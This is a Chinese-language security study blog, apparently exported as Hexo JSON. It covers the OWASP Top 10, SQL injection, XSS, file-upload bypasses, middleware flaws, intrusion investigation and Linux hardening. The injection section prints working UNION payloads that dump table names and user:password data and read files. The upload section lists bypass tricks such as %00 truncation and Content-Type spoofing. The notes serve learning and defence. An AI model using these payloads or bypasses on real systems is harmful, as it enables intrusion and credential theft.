{"meta":{"title":"我要干饭！","subtitle":"","description":"","author":"我要干饭！","url":"http://xjuun.github.io"},"pages":[{"title":"个人简介","date":"2021-11-09T16:58:45.000Z","updated":"2021-11-09T17:05:11.683Z","comments":true,"path":"about/index.html","permalink":"http://xjuun.github.io/about/index.html","excerpt":"","text":"性别：男爱好：女特长：又菜又爱玩QQ：1369194769（欢迎来骚扰^_^）"},{"title":"categories","date":"2021-11-08T06:12:15.000Z","updated":"2022-04-16T11:19:21.364Z","comments":true,"path":"categories/index.html","permalink":"http://xjuun.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-11-09T04:32:07.000Z","updated":"2021-11-09T04:34:39.047Z","comments":true,"path":"tags/index.html","permalink":"http://xjuun.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"重装系统后hexo博客恢复","slug":"重装系统后hexo博客恢复","date":"2022-10-30T09:24:11.000Z","updated":"2022-10-30T09:40:29.888Z","comments":true,"path":"2022/10/30/重装系统后hexo博客恢复/","link":"","permalink":"http://xjuun.github.io/2022/10/30/%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F%E5%90%8Ehexo%E5%8D%9A%E5%AE%A2%E6%81%A2%E5%A4%8D/","excerpt":"","text":"（已有旧博客的文件夹备份）参考：电脑重装系统后hexo如何恢复部署hexo博客 一、安装 node.js 和 git（nedejs安装还是不要安c盘，老是有奇奇怪怪的问题）（而且似乎不用配置环境变量） 二、设置git配置 git 个人信息，生成新的 ssh 密钥： 123git config --global user.name &quot;xxx&quot;//账号名git config --global user.email &quot;xxx&quot;//注册邮箱地址ssh-keygen -t rsa -C &quot;xxx&quot;//注册邮箱地址 一路回车，使用默认值即可。如果一切顺利的话，可以在用户主目录里找到.ssh目录，里面有id_rsa和id_rsa.pub两个文件 三、设置github上的公钥打开id_rsa.pub文件，复制里面的内容，复制到Github的settings里面的ssh选项里去可以使用ssh -T git@github.com命令查看是否绑定邮箱成功，成功的话会有hi，xxxxx啥的，我当时报错显示 1ssh: connect to host github.com port 22: Connection refused 个人猜测是22端口搞不了，一般都是换443端口，可用更换端口命令ssh -T -p 443 git@ssh.github.com 测试是否是因为此原因，如果是就在用户下的ssh文件夹下面找到config（如果没有就新建一个），修改为 1234567Host github.com User xxxxx@xx.com Hostname ssh.github.com PreferredAuthentications publickey IdentityFile ~/.ssh/id_rsa Port 443 四、安装hexo：1npm install hexo-cli -g 五、修改备份文件夹打开原来的hexo博客所在文件夹，只需保留_config.yml，theme/，source/，scaffolds/，package.json，.gitignore 这些项目，删除其他的文件。 六、部署然后打开 git bush 运行命令： 1npm install 1npm install hexo-deployer-git --save //hexo d 部署到git插件 八、测试是否成功12hexo ghexo d 博客部署恢复完成。","categories":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://xjuun.github.io/tags/hexo/"},{"name":"git","slug":"git","permalink":"http://xjuun.github.io/tags/git/"},{"name":"nodejs","slug":"nodejs","permalink":"http://xjuun.github.io/tags/nodejs/"}],"keywords":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}]},{"title":"安全设备","slug":"安全设备","date":"2022-05-11T14:44:35.000Z","updated":"2022-05-11T14:45:09.442Z","comments":true,"path":"2022/05/11/安全设备/","link":"","permalink":"http://xjuun.github.io/2022/05/11/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/","excerpt":"","text":"设备根据网络情况可以分为三种：经典网络、私有云、公有云 经典网络即客户拥有物理的基础设施（自建机房、自购设备、网络） NGAF/NGFW：下一代 Web 应用防火墙（Next Generation Application Firewall，通防火墙和下一代防火墙的区别），聚合了以下功能 123456IDS HIDS：基于主机的入侵检测系统 NIDS：基于网络的入侵检测系统 HIDS+NIDS：基于混合数据源的入侵检测系统IPS：入侵防御系统AV：反病毒系统 EDR：主机安全管理\\终端检测和响应 EDR 实时监测终端上发生的各类行为，采集终端运行状态，在后端通过大数据安全分析、机器学习、沙箱分析、行为分析、机器学习等技术，提供深度持续监控、威胁检测、高级威胁分析、调查取证、事件响应处置、追踪溯源等功能，可第一时间检测并发现恶意活动，包括已知和未知威胁，并快速智能地做出响应，全面赋予终端主动、积极的安全防御能力 简单来说就是给内网环境中所有主机安装管理软件终端，可以在管理平台集中管理和数据分析过滤，基本所有安全厂商都有自己的 EDR 产品 运维审计和管理平台（堡垒机） DAS：数据库安全审计平台 LAS：日志审计安全平台 AC：上网行为管理系统 伪装欺骗系统（蜜罐、蜜网） SIP：安全态势感知平台 这个算是让整套系统性能得到提升的灵魂了，定位为客户的安全大脑，是一个集检测、可视、响应处置于一体的大数据安全分析平台。产品以大数据分析为核心，支持主流的安全设备、网络设备、操作系统等多源数据接入，利用大数据、关联分析、告警降噪等技术，实现海量数据的统一挖掘分析 云网络云网络包括私有云和公有云 123456云主机安全云防火墙云堡垒机云蜜罐云 DDOS 防护等等","categories":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"安全设备","slug":"安全设备","permalink":"http://xjuun.github.io/tags/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/"}],"keywords":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}]},{"title":"攻击研判","slug":"攻击研判","date":"2022-05-11T14:33:35.000Z","updated":"2022-05-11T14:44:33.880Z","comments":true,"path":"2022/05/11/攻击研判/","link":"","permalink":"http://xjuun.github.io/2022/05/11/%E6%94%BB%E5%87%BB%E7%A0%94%E5%88%A4/","excerpt":"","text":"研判（入侵检测）研判我理解为人工层面对入侵检测事件进行再分析，即借助已有的设备告警根据经验判断是否为真实攻击 研判工作我们要充分利用已有安全设备（需要提前了解客户的网络拓扑以及部署设备情况），分析其近期的设备告警，将全部流量日志（日志条件：源地址，目的地址，端口，事件名称，时间，规则ID，发生 次数等）根据研判标准进行筛选（像挖矿、蠕虫、病毒、拒绝服务这类不太可能为攻击方发起的攻击的事件，直接过滤掉，减少告警数量），一般情况下，真实攻击不可能只持续一次，它一定是长时间、周期性、多IP的进行攻击 对于告警结合威胁情报库如：微步、奇安信威胁情报中心等对于流量日志的原 IP 地址进行分析，判断其是否为恶意攻击，推荐使用微步的插件，如果确认为攻击行为或者不能确认是否为攻击行为，进行下一步操作，在之前准备好的表格中查找 IP 是否为客户内网部署的设备，如果不是，继续进行下一步，在事件上报平台查看是否有其他人提交过，如果没有，则上报 然后根据流量日志，对请求数据包和返回数据包分析判断其是否为误报，需要留意 X-Forwarded-For（简称XFF）和x-real-ip 可以了解些 webshell 工具的流量特征，尤其是免杀 webshell，有可能不会被设备识别 最后上报事件时，尽可能提供完整的截图，包括源 ip、目的ip，请求包请求体，响应包响应体等重要信息，以方便后续人员研判溯源 注：不要任意忽略内网告警，适当情况下可以往前推排查时间","categories":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"研判","slug":"研判","permalink":"http://xjuun.github.io/tags/%E7%A0%94%E5%88%A4/"}],"keywords":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}]},{"title":"Top 10 漏洞","slug":"top 10 漏洞","date":"2022-05-10T14:33:35.000Z","updated":"2022-05-10T14:45:08.102Z","comments":true,"path":"2022/05/10/top 10 漏洞/","link":"","permalink":"http://xjuun.github.io/2022/05/10/top%2010%20%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"OWASP 前 10 名名单 1.失效的访问控制*访问控制强制实施策略，使用户无法在其预期权限之外进行操作。失败的访问控制通常会导致未经授权的信息泄露、修改或销毁所有数据、或在用户权限之外执行业务功能。 2.加密机制失效首先要确认：对传输中数据和存储数据都有哪些保护需求。 例如，密码、信用卡号、医疗记录、个人信息和商业秘密需要额外保护，尤其是在这些数据属于隐私保护法（如：欧盟GDPR) 或法规条（如：金融数据保护标准PCI DSS)适用范围的情况下。 3.注入攻击1.注入漏洞的分类： 12345(1)SQL注入、(2)HTTP头注入、(3)HTML注入（XSS）注入、(4)XPATH注入、(5)Xml的外部实体注入等... 2.SQL注入概念：SQL注入，是一种将SQL语句插入或添加到用户输入参数中,之后再将这些参数传递给后台的SQL服务器加以解析并执行，最终达到欺骗服务器执行恶意的SQL命令。 3.SQL注入的成因： 12（1）.对用户的输入的数据，没有进行过滤，被带到了数据库中去执行，造成了SQL注入。（2）.程序编写者在处理程序与数据库交互时,使用字符串拼接的方式构造SQL语句 4.SQL注入的分类：（1）按数据类型分： 121，整形注入（不需要闭合,不需要注释符号）2，字符型注入（需要闭合,需要注释符号） （2）按注入语法分: 123451，联合查询型注入 2，报错注入 3，布尔型注入 4，延时注入 5，多语句查询注入 5.SQL注入判定过程：联合查询型注入：1.判断注入类型（整型、字符型）2.order by查询语言的字段数量3.报错猜解准备4.信息收集 获取数据库名 1xxx1&#x27; union select 1,group_concat(table_name),3,4,5,6,7,8 from information_schema.tables where table_schema=database() limit 0,1# 获取指定表的字段数量： 1xxx1&#x27;union select 1,count(*),3,4......from information_schema.columns where table_name=’user’ table_schema=database();# 获取指定表的字段名： 1xxx1&#x27;union select 1,group_concat(column_name),3,4.....from information_schema.columns where table_name=’user’;# 获取指定表中的数据： 1xx1&#x27;union select 1,group_concat(concat(user,&quot;:&quot;,password)),3,4,5,6,7,8 from users;# 读取文件函数：load_file条件： 1文件绝对路径、能够使用联合查询（注入）、对web目录有写权限 1注入再显示位中：1&#x27;union select 1,2,load_file(‘D://1.txt(绝对路径)’),4,5# **写入文件函数：into outfile ** 1文件名必须全路径（绝对路径）、用户必须有写文件的权限、没有对单引号过滤 1select 123456 init outfile ‘d:/111.txt’ Into dumpfile---mysql.ini 配置选项中secure-file-priv=’d:/’ 盲注布尔注入利用前提： 1页面上没有显示位，并且没有输出SQL语句执行错误信息,只能通过页面返回正常与不正常判断 优点：不需要显示位缺点：速度慢，耗费大量时间。常用函数： 123left()含义：Left()得到字符串左部指定个数的字符 –使用方法：Left ( string, n ) string 为要截取的字符串， n 为长度 。 123Length():含义：得到字符串的长度使用方法：length(str) – 1234Substr()：含义 Substr()函数实现的功能是截取字符串使用方法 Substr(string,start,lengh)string为参数要处理的字符串，start为开始 位置，length为截取的字符串长度 1(1) substr(DATABASE(),1,1)&gt;’a’,查看数据库名第一位， substr(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。 12ascii()：含义：Ascii()返回字符串str的最左面的ASCII代码值。如果str是空字符，返回0，如果str是 NULL，返回NULL • 报错注入利用前提：页面上没有显示位，但需要输出 SQL 语句执行错误信息优点：不需要显示位缺点：需要输出mysql_error()的报错信息 1234567rand（）：随机数函数select rand();floor（）：向下取整函数 select floor(rand());count（）：计数函数 select count(*) from users;group by：分组方法 延时注入利用前提: 页面上没有显示位，也没有输出SQL语句执行错误信息。正确的SQL语句和错误的SQL语句返回页面都一样，但是加入sleep(5)条件之后，页面的返回速度明显慢了5秒。优点: 不需要显示位，不需要出错信息。缺点: 速度慢，耗费大量时间。延时注入相关函数 123if( 测试条件 , 结果 1, 结果 2)1If()函数解释：当测试条件为真时，结果显示1，若测试条件 为假时，则显示结果2 If()函数示例： 12ascii() 函数substr() 函数 宽字节注入 6.SQL注入的防御：1.对进入数据库的特殊字符（单引号，双引号，尖括号等）进行转换或编码转换。2.不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取。3.不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。4.应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装 4.不安全的设计不安全设计是一个广泛的类别，代表不同的弱点，表示为“缺少或无效的控制设计”。 5.安全配置错误 应用程序栈的任何部分缺少适当的安全加固，或者云服务的权限配置错误。 应用程序启用或安装了不必要的功能（例如：不必要的端口、服务、网页、帐户或权限）。 默认帐户和密码仍然可用且没有更改。 错误处理机制向用户纰漏堆栈信息或其他大量错误信息。 对于升级的系统，最新的安全特性被禁用或未安全配置。 应用程序服务器、应用程序框架（如：Struts、Spring、ASP.NET）、库文件、数据库等没有进 行安全配置。 预防措施 搭建最小化平台，该平台不包含任何不必要的功能、组件、文档和示例。移除或不安装不适用的功 能和框架。 检查和修复安全配置项来适应最新的安全说明、更新和补丁，并将其作为更新管理过程的一部分 7.身份识别和身份验证错误8. 软件和数据完整性故障9.安全日志和监控故障如果不进行日志记录和监测，就无法发现违规行为。任何时候都会发生日志记录、检测、监视和主动响应不足的情况: 需要审计的事件，例如：登录、失败的登录和高价值交易，但未记录。警告和错误未生成日志或日志记录不充分或日志消息不清晰。应用程序和 API的日志未进行安全可疑活动的监控。日志只存储在本地。 10.服务端请求伪造一但Web应用在获取远程资源时没有验证用户提供的URL，就会出现SSRF缺陷。它允许攻击者强制应用程序发送一个精心构建的请求到一个意外目的地，即使是在有防火墙、VPN或其他类型的网络访问控制列表（ACL）保护的情况下。","categories":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"http://xjuun.github.io/tags/%E6%BC%8F%E6%B4%9E/"}],"keywords":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}]},{"title":"xss与文件上传","slug":"xss与文件上传","date":"2022-05-10T14:33:35.000Z","updated":"2022-05-10T14:45:43.232Z","comments":true,"path":"2022/05/10/xss与文件上传/","link":"","permalink":"http://xjuun.github.io/2022/05/10/xss%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","excerpt":"","text":"1、什么是XSSXSS全称跨站脚本这是一种将任意 Javascript 代码插入到其他Web用户页面里执行以达到攻击目的的漏洞。攻击者利用浏览器的动态展示数据功能，在HTML页面里嵌入恶意代码。当用户浏览改页时，这些潜入在HTML中的恶意代码会被执行，用户浏览器被攻击者控制，从而达到攻击者的特殊目的，如 cookie窃取等。 2、XSS产生原因、漏洞原理形成XSS漏洞的主要原因是程序对输入和输出的控制不够严格，导致“精心构造”的脚本输入后，在输到前端时被浏览器当作有效代码解析执行从而产生危害。 3、XSS会造成那些危害？攻击者通过Web应用程序发送恶意代码，一般以浏览器脚本的形式发送给不同的终端用户。当一个Web程序的用户输入点没有进行校验和编码，将很容易的导致XSS。 1234567891011121、网络钓鱼，包括获取各类用户账号2、窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作；3、劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、强制发表日志、电子邮件等4、强制弹出广告页面、刷流量等5、网页挂马；6、进行恶意操作，如任意篡改页面信息、删除文章等7、进行大量的客户端攻击，如ddos等8、获取客户端信息，如用户的浏览历史、真实p、开放端口等9、控制受害者机器向其他网站发起攻击；10、结合其他漏洞，如csrf，实施进步危害；11、提升用户权限，包括进一步渗透网站12、传播跨站脚本蠕虫等 4、XSS的防御形成XSS漏洞的主要原因是程序对输入和输出的控制不够严格，因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理: 输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入; 输出转义：根据输出点的位置对输出到前端的内容进行适当转义; 反射性XSS又称非持久型XSS，这种攻击方式往往具有一次性，只在用户单击时触发。跨站代码一般存在链接中，当受害者请求这样的链接时，跨站代码经过服务端反射回来，这类跨站的代码通常不存储服务端 存储型XSS攻击脚本将被永久的存放在目标服务器的数据库或文件中。这是利用起来最方便的跨站类型，跨站代码存储于服务端（比如数据库中） DOM型XSS其并不需要服务器解析响应，客户端浏览器可以直接DOM解析，攻击者发送恶意url给用户浏览器 文件上传上传漏洞定义文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端的shell 上传漏洞满足条件首先，上传的文件能够被web容器解释执行。 其次，用户能够从web访问这个文件。如果文件上传了，但用户无法通过web访问，或者无法得到web容器解释这个脚本，那么也不能称之为漏洞。 最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。 上传漏洞产生的原因一些web应用程序中允许上传图片，文本或者其他资源到指定的位置，文件上传漏洞就是利用这些可以上传的地方将恶意代码植入到服务器中，再通过 url 去 访问以执行代码. 上传漏洞绕过1.客服端绕过（1）客户端校验:一般都是在网页上写一段 javascript 脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。 通过利用 burp 抓包改包，先上传一个 gif 类型的木马，然后通过 burp 将其改为asp/php/jsp 后缀名即可 注意：这里修改文件名字后，请求头中的 Content-Length 的值也要改。 2.服务端绕过（1）黑名单扩展名绕过 黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。绕过方法：（1）找黑名单扩展名的漏网之鱼 - 比如 iis6.0 中的 asa 和 cer （2）可能存在大小写绕过漏洞 - 比如 aSp(iis6.0 中可以）和 pHp（只能在 小于 php5.3.39 中的 linux 中）之中 （3）能被web容器解析的文件其他扩展名列表： jsp, jspx ,jspf asp asa cer cdx,htr,xml,html aspx,ashx,asmx,asax,ascx （2）黑名单特殊后缀名绕过（利用难度高） （3）单双重后缀名绕过 （4）服务端 MIME 文件类型(Content-Type)绕过 绕过方法：上传对文件类型做了限制，可通过 burpsuit 将其他类文件类型 修改为如：Content-Type：image/gif 和 image/jpeg 等运行的文件类型。 3.白名单绕过：（1）配合web容器的解析漏洞： IIS中的目录解析漏洞和分号解析漏洞 ： 将一句话木马的文件名 backlion.php，改成 backlion.php.abc(奇怪的不被解析的后缀名都 行)。nginx 空字节漏洞 xxx.jpg%00.php 这样的文件名会被解析为php代码运行。apache 的解析漏洞，上传如 a.php.rar a.php.gif 类型的文件名，可以避免 对于php文件的过滤机制，但是由于 apache 在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar 等扩展名是 apache 不能识别的， 因此就会直接将类型识别为 php，从而达到了注入php代码的目的。 （2）%00 截断上传绕过 通过抓包截断将 backlion.asp.jpg 后面的一个.换成%00 在上传的时候即 backlion.asp%00.jpg，当文件系统读到%00 时，会认为文件已经结束，从而将 backlion.asp.jpg 的内容写入到 backlion.asp 中，从而达到攻击的目的。%00 不是针对所有基于白名单的后缀名检查都能绕过，代码的实现过程中必须存在截 断上传漏洞，上传格式如下：bk.asp%00.jpg （3）文件头内容检测绕过 3.绕过 WAF 文件上传的方法（1）填充垃圾数据绕过（2）文件重命名绕过 漏洞修复1.本地文件上传限制被绕过:在服务器后端对上传的文件迚行过滤。 2.设置文件上传的目录设置为不可执行 3.判断文件类型 4.使用随机数改写文件名和文件路径 5.单独设置文件服务器的域名 6.上waf","categories":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"http://xjuun.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"xss","slug":"xss","permalink":"http://xjuun.github.io/tags/xss/"}],"keywords":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}]},{"title":"中间件漏洞","slug":"中间件漏洞","date":"2022-05-10T14:33:35.000Z","updated":"2022-05-10T14:35:20.410Z","comments":true,"path":"2022/05/10/中间件漏洞/","link":"","permalink":"http://xjuun.github.io/2022/05/10/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"什么是中间件12345中间件：是一类能够为一种或多种应用程序合作互通、资源共享，同时还能够为该应用程序提供相关的服务的软件。（注意：中间件是一类软件的总称，不是单独的一个软件）我们经常管web中间件叫做web服务器或者web容器正常情况下一次web的访问顺序是：web浏览器---服务器(硬件)---web容器---web应用服务器---数据库服务器。 常用的中间件： ISS、Apache、Nginx、Tomcat、shiro、WebLogic、Jboss、WebSphere等 各中间件漏洞总结： ISS：解析漏洞 123456789101112131415ISS 6.x版本 基于文件名 该版本会默认把.asp;.jpg文件当成.asp文件来执行，原理是服务器默认不解析分号;后面的内容，相当于截断。 基于文件夹名 该版本.asp可以作为文件夹名且会默认将.asp/目录下的所有文件当成Asp文件解析。 该版本配置默认将.asa，.cdx，.cer解析为asp ISS7.x版本 在fast-cgi运行模式下，在任意文件例如1.jpg后面加上/.php都会将该文件解析为php文件 PUT任意文件写入 1在web服务扩展中开启WebDAV后，支持多种请求，配合写入权限可造成任意文件写入。 Apache 未知扩展名解析漏洞 1234 Apache对后缀名的解析是从右往左进行的，当遇到未知的后缀名时，会从右往左继续寻找，直到找到合法后缀名从解析，如a.php.xxx会以php文件进行执行。AddHandler application/x-httpd-php .php 这种情况下，只要文件名中包含.php的后缀，文件就会以php文件解析，.php可以不用是最后一个后缀，可利用这种特性构造文件名绕过上传白名单。 Httpd换行解析漏洞 123影响版本：2.4.0-2.4.29由于正则表达式不单匹配字符串的结尾位置，也可以匹配\\n,\\r，因此在解析php时，如1.php\\x0A会被按php后缀解析，导致绕过一些服务器的安全策略。 Nginx 任意解析漏洞： 12 小皮面板（8.1.0.4、8.1.0.7）默认配置下存在任意文件解析漏洞：上传图片马，在图片马地址后面加/.php即可执行图片马。此漏洞为Nginx配置所导致，与Nginx版本无关。 空字节任意代码执行漏洞： 12 影响版本：0.5.*，0.6.*，0.7&lt;=0.7.65,0.8&lt;=0.8.37若目录下存在一个实际为php文件的a.jpg文件，可通过访问该文件，抓包，修改为a.jpg...php,在hex选项卡中将jpg后的.修改为00即可让文件依旧以php解析。该漏洞不受cgi.fix_pathinfo影响，当其为0时依旧解析。 文件名逻辑漏洞 12影响版本：0.8.41-1.4.3/1.5.0-1.5.7实现方法与上一个相类似，访问a.jpg，抓包修改为a.jpg...php，在hex选项卡中修改jpg后的两个点2e为20,00，即可以php文件解析，该漏洞不受cgi.fix_pathinfo影响，当其为0时依旧解析。 CRLF注入 1234567这是一项由于配置不当所导致的漏洞。 Nginx文档有3个表示uri的变量：1.uri 2.document_uri 3.$request_uri 1,2表示解码以后的请求路径，不带参数，3表示的是完整的URI（没有编码） Nginx会将1，2进行解码，导致传入%0a%0b即可引入换行符，导致CRLF注入漏洞 目录穿越 1在配置Nginx别名时忘记加/，导致访问..可穿越至上级目录。 目录遍历 12当配置文件中，autoindex值设置为on时，将产生目录遍历漏洞。 Tomcat123Tomcat任意文件写入（CVE-2017-12615）环境：Tomcat/8.0.30当配置文件/conf/web.xml配置了可写（readonly=false），即可往服务器写文件 1234567891011Apache Tomcat远程代码执行（CVE-2019-0232） 影响范围：9.0.0.M1-9.0.17，8.5.0-8.5.39,7.0.0-7.0.93 影响系统：windows 启用了CGI Servlet（默认为关闭），enableCmdLineArguments（Tomcat 9.0.*及官方未来发布版本默认为关闭） 由于JRE将命令行参数传递给Windows的方式存在错误，会导致CGI Servlet受到远程执行代码的攻击。Tomcat+弱口令&amp;&amp;后台getshell漏洞 影响范围：Apache Tomcat 8","categories":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"http://xjuun.github.io/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"中间件","slug":"中间件","permalink":"http://xjuun.github.io/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"}],"keywords":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}]},{"title":"后门安全排查（Windows与Linux入侵排查）","slug":"后门安全排查（windows与linux入侵排查）","date":"2022-05-10T14:33:35.000Z","updated":"2022-05-10T14:51:13.717Z","comments":true,"path":"2022/05/10/后门安全排查（windows与linux入侵排查）/","link":"","permalink":"http://xjuun.github.io/2022/05/10/%E5%90%8E%E9%97%A8%E5%AE%89%E5%85%A8%E6%8E%92%E6%9F%A5%EF%BC%88windows%E4%B8%8Elinux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%EF%BC%89/","excerpt":"","text":"Windows入侵排查思路检查系统账号安全 123456789查看服务器是否有弱口令，远程管理端口是否对公网开放（使用netstat -ano 命令、或者问服务器管理员）lusrmgr.msc 命令查看服务器是否存在可疑账号、新增账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉用 D 盾或者注册表中查看服务器是否存在隐藏账号、克隆账号结合日志，查看管理员登录时间、用户名是否存在异常检查方法：Win+R 打开运行，输入“eventvwr.msc”，回车运行，打开“事件查看器”，导出 Windows 日志–安全，利用 Log Parser 进行分析 检查异常端口、进程 123456789netstat -ano检查端口连接情况，是否有远程连接、可疑连接任务管理器-进程检查启动项、计划任务、服务检查系统相关信息查看系统版本以及补丁信息查找可疑目录及文件 日志分析 Linux入侵排查思路账号安全 123who 查看当前登录用户（tty本地登陆 pts远程登录）w 查看系统信息，想知道某一时刻用户的行为uptime 查看登陆多久、多少用户，负载 1、用户信息文件/etc/passwd 1234root:x:0:0:root:/root:/bin/bashaccount:password:UID:GID:GECOS:directory:shell用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell注意：无密码只允许本机登陆，远程不允许登陆 2、影子文件/etc/shadow 1234root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留/etc/passwd 存储一般的用户信息，任何人都可以访问；/etc/shadow 存储用户的密码信息，只有 root 用户可以访问 历史命令 123456通过 .bash_history 查看帐号执行过的系统命令1、root的历史命令 histroy2、打开 /home 各帐号目录下的 .bash_history，查看普通帐号的历史命令历史操作命令的清除：history -c但此命令并不会清除保存在文件中的记录，因此需要手动删除.bash_profile文件中的记录 检查异常端口 123netstat -antlp|more查看下pid所对应的进程文件路径，运行ls -l /proc/$PID/exe或file /proc/$PID/exe（$PID 为对应的pid 号） 检查异常进程 12345678ps aux | grep pid1检查开机启动项开机启动配置文件/etc/rc.local/etc/rc.d/rc[0~6].d 检查定时任务 12345crontab -l 列出某个用户cron服务的详细内容Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/rootcrontab -r 删除每个用户cront任务(谨慎：删除所有的计划任务)crontab -e 使用编辑器编辑当前的crontab文件如：*/1 * * * * echo &quot;hello world&quot; &gt;&gt; /tmp/test.txt 每分钟写入文 重点关注 123456789/var/spool/cron/*/etc/crontab/etc/cron.d/*/etc/cron.daily/*/etc/cron.hourly/*/etc/cron.monthly/*/etc/cron.weekly//etc/anacrontab/var/spool/anacron/* 检查服务 1chkconfig --list 命令，可以查看系统运行的服务 检查异常文件 检查系统日志 12345678910Linux的登录日志查看文件日志默认存放位置：/var/log/查看可登录的账户 cat/etc/passwd|grep ‘/bin/bash’查看所有用户最后的登录信息 lastlog查看用户最近登录信息 last 其中，/var/log/wtmp 存储登录成功的信息、btmp 存储登录失败的信息、utmp 存储当前正在登录的信息查看当前用户登录系统情况 whoLinux常用排查命令这个问题就是 linux 入侵排查排查的一部分https://cloud.tencent.com/developer/article/1822210 系统信息 1234567查看当前系统状态 top操作系统信息 uname -a查看当前系统进程信息 ps查看历史命令 history列出本机所有的连接和监听的端口 netstat查看谁在使用某个端口 lsof用户登录","categories":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"后门排查","slug":"后门排查","permalink":"http://xjuun.github.io/tags/%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5/"}],"keywords":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}]},{"title":"基线规范与系统安全加固","slug":"基线规范 与 系统安全加固","date":"2022-05-10T14:33:35.000Z","updated":"2022-05-10T14:52:18.860Z","comments":true,"path":"2022/05/10/基线规范 与 系统安全加固/","link":"","permalink":"http://xjuun.github.io/2022/05/10/%E5%9F%BA%E7%BA%BF%E8%A7%84%E8%8C%83%20%E4%B8%8E%20%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/","excerpt":"","text":"Linux基线规范账号管理和授权 12345检查特殊账号，是否存在空密码的账户和 root 权限账户禁用或删除无用账号添加口令策略:/etc/login.defs修改配置文件，设置过期时间、连续认证失败次数禁止 root 远程登录，限制root用户直接登录。检查 su 权限。vi /etc/pam.d/su添加auth required pam_wheel.so group=test 服务 12345关闭不必要的服务SSH 服务安全不允许 root 账号直接登录系统，PermitRootLogin=no修改 SSH 使用的协议版本为 2修改允许密码错误次数（默认 6 次），MaxAuthTries=3 文件系统 1234567设置 umask 值 vi /etc/profile 添加行 umask 027设置登录超时 vi /etc/profile 修改配置文件，将以 TMOUT= 开头的行注释，设置为 TMOUT=180日志启用 syslogd 